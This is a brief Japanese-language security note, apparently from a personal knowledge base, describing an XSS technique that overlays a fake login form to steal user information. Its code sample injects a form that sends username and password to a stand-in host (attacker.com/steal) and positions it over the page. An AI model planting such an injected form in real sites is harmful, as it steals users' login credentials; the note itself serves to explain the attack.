---
分類: 攻撃手段
tags:
  - Tricky
---
## 概要
XSS攻撃の一種、画面上に偽のフォームを表示すること、ユーザーからの情報を盗み取る。

```javascript
// This is the malicious injection that creates a deceptive overlay form
<form action="http://attacker.com/steal" id="login">
    <input type="text" name="username">
    <input type="password" name="password">
    <input type="submit" value="Login">
</form>
<script>
    document.getElementById('login').style.position = 'absolute';
    document.getElementById('login').style.top = '50%';
</script>
```